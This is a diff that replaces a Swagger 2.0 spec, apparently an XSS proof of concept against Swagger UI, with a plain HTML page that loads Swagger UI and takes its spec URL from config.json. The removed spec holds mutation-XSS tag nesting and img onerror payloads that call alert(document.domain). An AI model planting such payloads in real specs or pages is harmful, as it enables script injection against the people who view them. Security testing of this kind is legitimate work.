@@ -1,45 +1,47 @@
-swagger: '2.0'
-info:
-  title: Swagger UI XSS Test – TheeHerbie
-  description: |
-    <form><math><mtext></form>
-    <form><mglyph>
-    <svg>
-    <mtext>
-    <textarea><path id="</textarea>
-    <img src=1 onerror=alert(document.domain)>
-    </form>
-  version: "1.0"
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Swagger Login Demo</title>
 
-basePath: /api/
-schemes:
-  - https
+  <link rel="stylesheet" href="https://unpkg.com/swagger-ui-dist/swagger-ui.css" />
 
-produces:
-  - application/json
-consumes:
-  - application/json
+  <style>
+    body {
+      margin: 0;
+      background: #fafafa;
+    }
+  </style>
+</head>
 
-paths:
-  /demo:
-    get:
-      summary: Demo endpoint for Swagger UI rendering test
-      description: |
-        <img src=1 onerror=alert('Swagger UI XSS – TheeHerbie')>
-      responses:
-        '200':
-          description: OK
+<body>
+  <div id="swagger-ui"></div>
 
-  /resource/{id}:
-    delete:
-      summary: Parameter rendering test
-      parameters:
-        - name: id
-          in: path
-          required: true
-          type: string
-          description: |
-            <img src=1 onerror=alert(document.domain)>
-      responses:
-        '200':
-          description: Deleted
+  <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-bundle.js"></script>
+  <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-standalone-preset.js"></script>
+
+  <script>
+    fetch('./config.json')
+      .then(res => res.json())
+      .then(config => {
+        window.ui = SwaggerUIBundle({
+          url: config.swaggerUrl,
+          dom_id: '#swagger-ui',
+          deepLinking: true,
+          presets: [
+            SwaggerUIBundle.presets.apis,
+            SwaggerUIStandalonePreset
+          ],
+          layout: "StandaloneLayout",
+          docExpansion: config.docExpansion,
+          filter: config.filter,
+          displayRequestDuration: config.displayRequestDuration,
+          persistAuthorization: config.persistAuthorization
+        });
+      })
+      .catch(err => {
+        console.error("Failed to load config.json", err);
+      });
+  </script>
+</body>
+</html>
